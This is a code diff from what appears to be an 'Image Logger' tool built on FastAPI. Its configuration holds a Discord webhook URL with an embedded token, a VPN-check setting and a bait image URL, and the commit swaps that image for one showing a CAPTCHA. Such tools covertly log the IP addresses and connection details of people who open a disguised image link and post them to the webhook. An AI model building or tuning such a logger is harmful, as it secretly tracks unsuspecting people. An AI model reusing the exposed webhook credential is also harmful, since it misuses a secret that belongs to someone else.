@@ -7,7 +7,7 @@ app = FastAPI()
 
 CONFIG = {
     "webhook": "https://discord.com/api/webhooks/1557128220539748453/mqJGIA5CamQ7YU5zJcHeZXXE13yp4r_sJDRNejAHrCGe-OeebnAg9-wrcINBg1AK52fM",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
+    "image": "https://www.avg.com/hs-fs/hubfs/Blog_Content/Avg/Signal/AVG%20Signal%20Images/what_is_captcha_and_how_does_it_work_signal/img-02.png?width=251&height=127&name=img-02.png",
     "username": "Image Logger",
     "color": 0x00FFFF,
     "vpnCheck": 1, 
